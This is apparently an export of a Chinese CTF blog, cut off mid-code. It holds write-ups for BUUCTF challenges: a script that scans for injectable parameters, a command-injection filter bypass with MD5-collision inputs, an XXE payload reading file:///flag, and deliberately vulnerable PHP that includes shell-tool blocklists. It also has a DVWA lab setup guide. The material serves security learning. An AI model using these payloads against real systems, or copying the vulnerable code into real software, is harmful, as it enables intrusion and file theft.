&#x3D; session.post(url, data&#x3D;data, params&#x3D;params)			#一次性请求所有的GET和POST</span><br><span class="line">    req.close()												# 关闭请求  释放内存</span><br><span class="line">    req.encoding &#x3D; &#39;utf-8&#39;</span><br><span class="line">    content &#x3D; req.text</span><br><span class="line">    #print(content)</span><br><span class="line">    if &quot;xxxxxx&quot; in content:									#如果发现有可以利用的参数，继续筛选出具体的参数</span><br><span class="line">        flag &#x3D; 0</span><br><span class="line">        for a in gets:</span><br><span class="line">            req &#x3D; session.get(url+&#39;?%s&#x3D;&#39;%a+&quot;echo &#39;xxxxxx&#39;;&quot;)</span><br><span class="line">            content &#x3D; req.text</span><br><span class="line">            req.close()												# 关闭请求  释放内存</span><br><span class="line">            if &quot;xxxxxx&quot; in content:</span><br><span class="line">                flag &#x3D; 1</span><br><span class="line">                break</span><br><span class="line">        if flag !&#x3D; 1:</span><br><span class="line">            for b in posts:</span><br><span class="line">                req &#x3D; session.post(url, data&#x3D;&#123;b:&quot;echo &#39;xxxxxx&#39;;&quot;&#125;)</span><br><span class="line">                content &#x3D; req.text</span><br><span class="line">                req.close()												# 关闭请求  释放内存</span><br><span class="line">                if &quot;xxxxxx&quot; in content:</span><br><span class="line">                    break</span><br><span class="line">        if flag &#x3D;&#x3D; 1:													#flag用来判断参数是GET还是POST，如果是GET，flag&#x3D;&#x3D;1，则b未定义；如果是POST，flag为0，</span><br><span class="line">            param &#x3D; a</span><br><span class="line">        else:</span><br><span class="line">            param &#x3D; b</span><br><span class="line">        print(&#39;找到了利用文件： &#39;+file+&quot;  and 找到了利用的参数：%s&quot; %param)</span><br><span class="line">        print(&#39;结束时间：  &#39; + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line">for i in files:															#加入多线程</span><br><span class="line">   t &#x3D; threading.Thread(target&#x3D;get_content, args&#x3D;(i,))</span><br><span class="line">   t.start()</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/26/buu/1/image-20210726114732836.png" alt="image-20210726114732836"></p>
<p>真的太膜拜了，单线程的脚本我都不会写。。。</p>
<p>如图找到了可利用参数和文件</p>
<p>接下来就是进行访问对应文件来进行利用</p>
<p>结果如图</p>
<p><img src="/2021/07/26/buu/1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(301).png" alt="屏幕截图(301)"></p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>安洵杯 2019 easy_web</title>
    <url>/2021/08/08/buu/10/</url>
    <content><![CDATA[<h4 id="0x00知识点"><a href="#0x00知识点" class="headerlink" title="0x00知识点"></a>0x00知识点</h4><h5 id="MD5碰撞的一些例子"><a href="#MD5碰撞的一些例子" class="headerlink" title="MD5碰撞的一些例子"></a>MD5碰撞的一些例子</h5><p><a href="https://www.jianshu.com/p/c9089fd5b1ba">https://www.jianshu.com/p/c9089fd5b1ba</a></p>
<h5 id="PHP代码安全【PHP弱口令、加密函数、绕过函数】-CTF代码审计题"><a href="#PHP代码安全【PHP弱口令、加密函数、绕过函数】-CTF代码审计题" class="headerlink" title="PHP代码安全【PHP弱口令、加密函数、绕过函数】/CTF代码审计题"></a>PHP代码安全【PHP弱口令、加密函数、绕过函数】/CTF代码审计题</h5><p><a href="https://sp4rkw.blog.csdn.net/article/details/79088218">https://sp4rkw.blog.csdn.net/article/details/79088218</a></p>
<h4 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题</h4><p>靶机启动：</p>
<p><img src="/2021/08/08/buu/10/image-20210809085159186.png" alt="image-20210809085159186"></p>
<p>观察到url路径存在参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;</span><br></pre></td></tr></table></figure>

<p>感觉这里就是切入点，img背后的似乎是base64码</p>
<p>在线解码一下（<a href="https://base64.us/%EF%BC%89%EF%BC%9A">https://base64.us/）：</a></p>
<p>TXpVek5UTTFNbVUzTURabE5qYz0</p>
<p>MzUzNTM1MmU3MDZlNjc=</p>
<p>3535352e706e67</p>
<p>连续两次base64解码后，得到一串字符串</p>
<p>查了资料，这是hex编码</p>
<p><img src="/2021/08/08/buu/10/image-20210809085725782.png" alt="image-20210809085725782"></p>
<p>再次解码：得到555.png，有意思</p>
<p>刚好靶机页面上就有一张哭泣图片</p>
<p>我们猜测，img后面的多次编码的参数请求可以得到源码</p>
<p>按照上面的解码逆推编码，可以得到</p>
<p>index.php:</p>
<p>696E6465782E706870</p>
<p>Njk2RTY0NjU3ODJFNzA2ODcw</p>
<p>TmprMlJUWTBOalUzT0RKRk56QTJPRGN3</p>
<p>将参数修改</p>
<p><img src="/2021/08/08/buu/10/image-20210809090352667.png" alt="image-20210809090352667"></p>
<p>f12查看</p>
<p><img src="/2021/08/08/buu/10/image-20210809090426959.png" alt="image-20210809090426959"></p>
<p>对base64解码得到源码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(&#39;content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);</span><br><span class="line">$cmd &#x3D; $_GET[&#39;cmd&#39;];</span><br><span class="line">if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;])) </span><br><span class="line">    header(&#39;Refresh:0;url&#x3D;.&#x2F;index.php?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;&#39;);</span><br><span class="line">$file &#x3D; hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));</span><br><span class="line"></span><br><span class="line">$file &#x3D; preg_replace(&quot;&#x2F;[^a-zA-Z0-9.]+&#x2F;&quot;, &quot;&quot;, $file);</span><br><span class="line">if (preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $file)) &#123;</span><br><span class="line">    echo &#39;&lt;img src &#x3D;&quot;.&#x2F;ctf3.jpeg&quot;&gt;&#39;;</span><br><span class="line">    die(&quot;xixi～ no flag&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $txt &#x3D; base64_encode(file_get_contents($file));</span><br><span class="line">    echo &quot;&lt;img src&#x3D;&#39;data:image&#x2F;gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\&#96;|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;forbid ~&quot;);</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;</span><br><span class="line">        echo &#96;$cmd&#96;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo (&quot;md5 is funny ~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="代码审计："><a href="#代码审计：" class="headerlink" title="代码审计："></a>代码审计：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\&#96;|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd</span><br></pre></td></tr></table></figure>

<p>这里对cmd的值进行了正则过滤，一般的l像s指令都不可以用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;</span><br><span class="line">       echo &#96;$cmd&#96;;</span><br><span class="line">   &#125; else &#123;</span><br><span class="line">       echo (&quot;md5 is funny ~&quot;);</span><br></pre></td></tr></table></figure>

<p>这里说明我们需要POST两个变量：a和b</p>
<p>它们作为字符串时的值弱比较不相等，md5加密的值强比较要相等（<strong>md5碰撞</strong>）</p>
<p>这里不太理解，所以先直接抄了wp的md5值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>

<p>POST传参</p>
<p>这里最好不要用hackbar，因为hackbar好像会把md5值再编码</p>
<p>（这个地方坑了我好久）</p>
<p>在请求到包后，直接在bp里改包</p>
<p>原来的GET请求直接改成POST请求</p>
<p><img src="/2021/08/08/buu/10/image-20210809092901502.png" alt="image-20210809092901502"></p>
<p>使用还没被ban掉的dir指令</p>
<p>查询到文件</p>
<p><img src="/2021/08/08/buu/10/image-20210809092634318.png" alt="image-20210809092634318"></p>
<p>然后直接用了多数博客都使用的绕过方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?cmd&#x3D;ca\t%20&#x2F;flag</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/08/buu/10/image-20210809093215609.png" alt="image-20210809093215609"></p>
<p>看网上还有一种方法读取flag：</p>
<p>sort命令：sort将文件的每一行作为一个单位，相互比较，比较原则是从首字符向后，依次按ASCII码值进行比较，最后将他们按升序输出。</p>
<p><img src="/2021/08/08/buu/10/1625650-20200130214928556-987685402.png" alt="img"></p>
<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://www.cnblogs.com/wangtanzhi/p/12244096.html">https://www.cnblogs.com/wangtanzhi/p/12244096.html</a></p>
<p><a href="https://blog.csdn.net/qq_43622442/article/details/106012150">https://blog.csdn.net/qq_43622442/article/details/106012150</a></p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>kali安装dvwa</title>
    <url>/2020/10/02/dvwa/kai%E5%AE%89%E8%A3%85dvwa/</url>
    <content><![CDATA[<h5 id="kali安装dvwa"><a href="#kali安装dvwa" class="headerlink" title="kali安装dvwa"></a>kali安装dvwa</h5><p> 之前啊就有这个想法，不过当时比较懒也没把安全放心上</p>
<p>(好吧，主要还是懒)，打开了kail来安装dvwa靶场，貌似在虚拟机上操作比较安全。</p>
<p> 步骤:</p>
<p> \1. 首先去github上下载DVWA的安装包，网址为：<a href="https://github.com/ethicalhack3r/DVWA">https://github.com/ethicalhack3r/DVWA</a><br> \2. 将下载好的压缩包解压并改名为dvwa，然后将其复制到 /var/www/html  文件夹中<br> \3. 打开终端，执行以下命令:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">将apache2停止：service apache2 stop</span><br><span class="line">给dvwa文件夹相应的权限：chmod -R 755 &#x2F;var&#x2F;www&#x2F;html&#x2F;dvwa</span><br><span class="line">启动mysql服务： service mysql start</span><br><span class="line">打开mysql： mysql -u root -p</span><br><span class="line">创建数据库：create database dvwa;</span><br><span class="line">退出mysql：exit</span><br><span class="line">启动apache2服务：service apache2 start</span><br></pre></td></tr></table></figure>

<p>打开浏览器，在地址栏中输入 127.0.0.1/dvwa  (或者 localhost/dvwa) ,</p>
<p>浏览器会自动跳转到127.0.0.1/dvwa/setup.php 页面，点击页面下方Create/Reset Database按钮，</p>
<p>竟然不能创建数据库，提示 Could not connect to the MySQL service. Please check the config file. 原来是相应配置文件还没有修改。按照以前的文章修改后发现仍然不能连接数据库，刚开始还以为搭建过程中某一步骤出问题了，重新试了一次还是不行，在网上搜索了一番终于找到了答案，原来Kali中的mysql数据库因为某些原因换为了MariaDB,而要连接MariaDB需要创建一个非root用户然后才能以root用户的身份去连接（仅针对此教程，其他的未测试）。   </p>
<p>  在这里遇到了好多问题，第一个就是先非root用户</p>
<p>  成功新增用户david后，我发现不能直接使用指令 ：<strong>sudo -i</strong></p>
<p>（处于非root用户时，输入：<strong>sudo -i</strong> 然后再输入当前用户的密码即可临时开启 <strong>root</strong> 权限）</p>
<p>david 不在 sudoers 文件中。此事将被报告 //呃，有点儿尴尬</p>
<p>查阅下才知道原来得在root下添加username：david</p>
<p>修改 /etc/sudoers 文件，找到下面一行，在root下面添加一行，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">## Allow root to run any commands anywhere</span><br><span class="line"></span><br><span class="line">root  ALL&#x3D;(ALL)   ALL</span><br><span class="line"></span><br><span class="line">david  ALL&#x3D;(ALL)   ALL  这边root名字下一行改成自己新增用户名字即可；</span><br></pre></td></tr></table></figure>

<p>​    \4. 终端执行 mysql -u root -p  ,回车，然后输入自己设置的MariDB用户的密码（如果没设置过的话就为空）</p>
<p> 执行以下SQL语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create user &#39;dvwauser&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;&#39;;</span><br><span class="line"></span><br><span class="line">GRANT ALL PRIVILEGES ON *.* to &#39;dvwauser&#39;@&#39;localhost&#39;;</span><br><span class="line"></span><br><span class="line">flush privileges;</span><br><span class="line"></span><br><span class="line">quit</span><br></pre></td></tr></table></figure>



<p>​    \5. 修改dvwa的配置文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;var&#x2F;www&#x2F;html&#x2F;dvwa&#x2F;config&#x2F;</span><br><span class="line"></span><br><span class="line">ls  </span><br><span class="line"></span><br><span class="line">cp config.inc.php.dist config.inc.php#这是复制命令操作</span><br></pre></td></tr></table></figure>



<p>​       将$_DVWA[ ‘db_user’ ]   = ‘root’;  修改为：             $_DVWA[ ‘db_user’ ]   = ‘dvwauser’; </p>
<p>​    </p>
<p>​        $_DVWA[ ‘db_password’ ] = ‘p@ssword’;  修改为：      $_DVWA[ ‘db_password’ ] = ‘’;   </p>
<p>这边我不太懂作者为什么一定要这样修改，因为其他很多文章改法不一，但是这样改不会报错就无妨。  </p>
<p>根据实际情况重启下apache2：  有点像PHP study那样启动相应程序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service apache2 restart</span><br></pre></td></tr></table></figure>



<p>   打开浏览器，在地址栏中输入 127.0.0.1/dvwa  (或者 localhost/dvwa) ,浏览器会自动跳转到127.0.0.1/dvwa/setup.php 页面，点击页面下方Create/Reset Database按钮，可以发现dvwa连接数据库成功并创建了相应的表。接下来就可以使用  </p>
<p>用户名： admin   密码： password  登录进行测试了！</p>
<p><img src="/2020/10/02/dvwa/kai%E5%AE%89%E8%A3%85dvwa/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(51).png"></p>
<p><img src="/2020/10/02/dvwa/kai%E5%AE%89%E8%A3%85dvwa/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(52).png"></p>
<p>这里同时收录下另一个问题：</p>
<h6 id="dvwa出现报错"><a href="#dvwa出现报错" class="headerlink" title="dvwa出现报错"></a>dvwa出现报错</h6><p>提示DVWA System error - config file not found. Copy config/config.inc.php.dist to config/config.inc.php and configure to your environment.</p>
<p>解决方法：提示已经告诉了，找不到配置文件，复制config目录下的config.inc.php.dist文件到config.inc.php，然后配置环境。于是按照他说的来，进入phpstudy安装目录下的WWW\DVWA\config中，把config.inc.php.dist复制一下，并且还在这个文件夹中粘贴，然后去掉后缀  .dist 。刷新即OK。</p>
<p>转载大部分内容于：<a href="https://blog.csdn.net/wanzt123/article/details/77476007">https://blog.csdn.net/wanzt123/article/details/77476007</a></p>
<p>参考链接：<a href="https://www.cnblogs.com/MirageFox/p/12852507.html">https://www.cnblogs.com/MirageFox/p/12852507.html</a></p>
<p><a href="https://www.cnblogs.com/myworld2018/p/8383611.html">https://www.cnblogs.com/myworld2018/p/8383611.html</a></p>
<p><a href="https://blog.csdn.net/weixin_39762423/article/details/83035209">https://blog.csdn.net/weixin_39762423/article/details/83035209</a></p>
<p><a href="https://blog.csdn.net/wenxuechaozhe/article/details/69092769">https://blog.csdn.net/wenxuechaozhe/article/details/69092769</a></p>
]]></content>
      <tags>
        <tag>dvwa</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎杯 2020 朱雀组 phpweb&amp;NCTF2019 Fake XML cookbook</title>
    <url>/2021/08/11/buu/11/</url>
    <content><![CDATA[<h3 id="0x00知识点"><a href="#0x00知识点" class="headerlink" title="0x00知识点"></a>0x00知识点</h3><p>XML可能存在的漏洞:<br>XML注入和XPath注入XML 外部实体注入</p>
<p><strong>什么是 XML？</strong><br>XML 指可扩展标记语言（EXtensible Markup Language）。<br>XML 的设计宗旨是传输数据，而不是显示数据。<br>XML 是 W3C 的推荐标准。<br>XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。<br>XML 语言没有预定义的标签</p>
<p><strong>XXE攻击</strong><br>附上链接：</p>
<p><a href="https://xz.aliyun.com/t/6887**%E4%BB%8EXML%E7%9B%B8%E5%85%B3%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%88%B0XXE%E6%BC%8F%E6%B4%9E">https://xz.aliyun.com/t/6887**从XML相关一步一步到XXE漏洞</a>**</p>
<p>XXE(XML External Entity Injection)全称为XML外部实体注入</p>
<p><a href="https://www.freebuf.com/vuls/175451.html">浅谈XML实体注入漏洞 - FreeBuf网络安全行业门户</a><strong>浅谈XML实体注入漏洞</strong></p>
<h3 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题</h3><h4 id="网鼎杯-2020-朱雀组"><a href="#网鼎杯-2020-朱雀组" class="headerlink" title="网鼎杯 2020 朱雀组"></a>网鼎杯 2020 朱雀组</h4><p><img src="/2021/08/11/buu/11/image-20210811193932874.png" alt="image-20210811193932874"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    $disable_fun &#x3D; array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);</span><br><span class="line">    function gettime($func, $p) &#123;</span><br><span class="line">        $result &#x3D; call_user_func($func, $p);</span><br><span class="line">        $a&#x3D; gettype($result);</span><br><span class="line">        if ($a &#x3D;&#x3D; &quot;string&quot;) &#123;</span><br><span class="line">            return $result;</span><br><span class="line">        &#125; else &#123;return &quot;&quot;;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class Test &#123;</span><br><span class="line">        var $p &#x3D; &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">        var $func &#x3D; &quot;date&quot;;</span><br><span class="line">        function __destruct() &#123;</span><br><span class="line">            if ($this-&gt;func !&#x3D; &quot;&quot;) &#123;</span><br><span class="line">                echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $func &#x3D; $_REQUEST[&quot;func&quot;];</span><br><span class="line">    $p &#x3D; $_REQUEST[&quot;p&quot;];</span><br><span class="line">    if ($func !&#x3D; null) &#123;</span><br><span class="line">    $func &#x3D; strtolower($func);</span><br><span class="line">    if (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">        echo gettime($func, $p);</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        die(&quot;Hacker...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/11/buu/11/image-20210811194437549.png" alt="image-20210811194437549"></p>
<h4 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="NCTF2019 Fake XML cookbook"></a>NCTF2019 Fake XML cookbook</h4><p>这题解题挺快的，有点像之前的sql注入</p>
<p>这次是进行恶意实体注入</p>
<p><img src="/2021/08/11/buu/11/image-20210812153137919.png" alt="image-20210812153137919"></p>
<p>尝试admin，抓个包</p>
<p><img src="/2021/08/11/buu/11/image-20210812153237740.png" alt="image-20210812153237740"></p>
<p>看到了POST提交数据后的页面</p>
<p>我们查看无输入数据的页面源代码</p>
<p>找到关键代码段</p>
<p><img src="/2021/08/11/buu/11/image-20210812153441742.png" alt="image-20210812153441742"></p>
<pre><code>function doLogin()&#123;
    var username = $(&quot;#username&quot;).val();
    var password = $(&quot;#password&quot;).val();
    if(username == &quot;&quot; || password == &quot;&quot;)&#123;
        alert(&quot;Please enter the username and password!&quot;);
        return;
    &#125;
var data = &quot;&lt;user&gt;&lt;username&gt;&quot; + username + &quot;&lt;/username&gt;&lt;password&gt;&quot; + password + &quot;&lt;/password&gt;&lt;/user&gt;&quot;; 
$.ajax(&#123;
    type: &quot;POST&quot;,
    url: &quot;doLogin.php&quot;,
    contentType: &quot;application/xml;charset=utf-8&quot;,
    data: data,
    dataType: &quot;xml&quot;,
    anysc: false,
    success: function (result) &#123;
        var code = result.getElementsByTagName(&quot;code&quot;)[0].childNodes[0].nodeValue;
        var msg = result.getElementsByTagName(&quot;msg&quot;)[0].childNodes[0].nodeValue;
        if(code == &quot;0&quot;)&#123;
            $(&quot;.msg&quot;).text(msg + &quot; login fail!&quot;);
        &#125;else if(code == &quot;1&quot;)&#123;
            $(&quot;.msg&quot;).text(msg + &quot; login success!&quot;);
        &#125;else&#123;
            $(&quot;.msg&quot;).text(&quot;error:&quot; + msg);
        &#125;
    &#125;,
    error: function (XMLHttpRequest,textStatus,errorThrown) &#123;
        $(&quot;.msg&quot;).text(errorThrown + &#39;:&#39; + textStatus);
    &#125;
&#125;); 
&#125;</code></pre>
<p><strong>摘抄：</strong></p>
<p><strong>XML可能存在的漏洞：</strong><br>XML注入和XPath注入XML 外部实体注入</p>
<p><strong>什么是 XML？</strong><br>XML 指可扩展标记语言（EXtensible Markup Language）。<br>XML 的设计宗旨是传输数据，而不是显示数据。<br>XML 是 W3C 的推荐标准。<br>XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。<br>XML 语言没有预定义的标签</p>
<p><strong>XXE攻击</strong><br>附上链接：</p>
<p><a href="https://xz.aliyun.com/t/6887">https://xz.aliyun.com/t/6887</a></p>
<p>XXE(XML External Entity Injection)全称为XML外部实体注入</p>
<p>Payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">  ]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt;&lt;password&gt;123456&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/11/buu/11/image-20210812154303323.png" alt="image-20210812154303323"></p>
<h6 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h6><p> <a href="https://blog.csdn.net/devilare/article/details/118969558">NCTF2019]Fake XML cookbook_devilare的博客-CSDN博客</a></p>
<p> <a href="https://blog.csdn.net/SopRomeo/article/details/105913611">NCTF2019]Fake XML cookbook_SopRomeo的博客-CSDN博客</a></p>
<p>[<a href="https://www.cnblogs.com/wangtanzhi/p/12323562.html">NCTF2019]Fake XML cookbook - 王叹之 - 博客园 (cnblogs.com)</a></p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>0CTF 2016 piapiapia</title>
    <url>/2021/08/17/buu/12/</url>
    <content><![CDATA[<h4 id="0x00知识点"><a href="#0x00知识点" class="headerlink" title="0x00知识点"></a>0x00知识点</h4><ul>
<li><h5 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h5></li>
<li><h5 id="参数传递数组绕过字符串检测"><a href="#参数传递数组绕过字符串检测" class="headerlink" title="参数传递数组绕过字符串检测"></a>参数传递数组绕过字符串检测</h5></li>
<li><h5 id="反序列化字符逃逸"><a href="#反序列化字符逃逸" class="headerlink" title="反序列化字符逃逸"></a>反序列化字符逃逸</h5><h5 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h5><p><a href="https://www.cnblogs.com/g0udan/p/12216207.html">0CTF 2016]piapiapia解题详细思路及复现 - g0udan - 博客园 (cnblogs.com)</a></p>
</li>
</ul>
<h4 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题<img src="/2021/08/17/buu/12/image-20210817200805927.png" alt="image-20210817200805927"></h4><p>进来是一个登录页面，很难登录，且也不是什么sql注入</p>
<p>f12无发现</p>
<p>这时候请出dirsearch(记得调低线程，不然会漏掉<a href="http://www.zip/">www.zip</a>)</p>
<p><img src="/2021/08/17/buu/12/image-20210817201129087.png" alt="image-20210817201129087"></p>
<p>通过后台扫描我们有了register页面，也就是注册页面</p>
<p>还有<a href="http://www.zip,config.php,update.php,这些我们后面都要用到./">www.zip,config.php,update.php,这些我们后面都要用到。</a></p>
<p><img src="/2021/08/17/buu/12/image-20210817204317100.png" alt="image-20210817204317100"></p>
<p>注册后登录</p>
<p><img src="/2021/08/17/buu/12/image-20210817201432160.png" alt="image-20210817201432160"></p>
<p><img src="/2021/08/17/buu/12/image-20210817201501824.png" alt="image-20210817201501824"></p>
<p>进入到updat.php,提示我们上传文件，本来我还以为是传图片马</p>
<p>结果本题核心不是，是前面扫出的<a href="http://www.zip源码提示了绕过/">www.zip源码提示了绕过</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line">require_once(&#39;class.php&#39;);</span><br><span class="line">if ($_SESSION[&#39;username&#39;] &#x3D;&#x3D; null) &#123;</span><br><span class="line">die(&#39;Login First&#39;);</span><br><span class="line">&#125;</span><br><span class="line">if ($_POST[&#39;phone&#39;] &amp; &amp; $_POST[&#39;email&#39;] &amp; &amp; $_POST[&#39;nickname&#39;] &amp; &amp; $_FILES[&#39;photo&#39;]) &#123;</span><br><span class="line"></span><br><span class="line">$username &#x3D; $_SESSION[&#39;username&#39;];</span><br><span class="line">if (!preg_match(&#39;&#x2F;^\d&#123;11&#125;$&#x2F;&#39;, $_POST[&#39;phone&#39;]))</span><br><span class="line">die(&#39;Invalid phone&#39;);</span><br><span class="line"></span><br><span class="line">if (!preg_match(&#39;&#x2F;^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$&#x2F;&#39;, $_POST[&#39;email&#39;]))</span><br><span class="line">die(&#39;Invalid email&#39;);</span><br><span class="line"></span><br><span class="line">if (preg_match(&#39;&#x2F;[^a-zA-Z0-9_]&#x2F;&#39;, $_POST[&#39;nickname&#39;]) | | strlen($_POST[&#39;nickname&#39;]) &gt; 10)</span><br><span class="line">die(&#39;Invalid nickname&#39;);</span><br><span class="line"></span><br><span class="line">$file &#x3D; $_FILES[&#39;photo&#39;];</span><br><span class="line">if ($file[&#39;size&#39;] &lt; 5 or $file[&#39;size&#39;] &gt; 1000000)</span><br><span class="line">die(&#39;Photo size error&#39;);</span><br><span class="line"></span><br><span class="line">move_uploaded_file($file[&#39;tmp_name&#39;], &#39;upload&#x2F;&#39;.md5($file[&#39;name&#39;]));</span><br><span class="line">$profile[&#39;phone&#39;] &#x3D; $_POST[&#39;phone&#39;];</span><br><span class="line">$profile[&#39;email&#39;] &#x3D; $_POST[&#39;email&#39;];</span><br><span class="line">$profile[&#39;nickname&#39;] &#x3D; 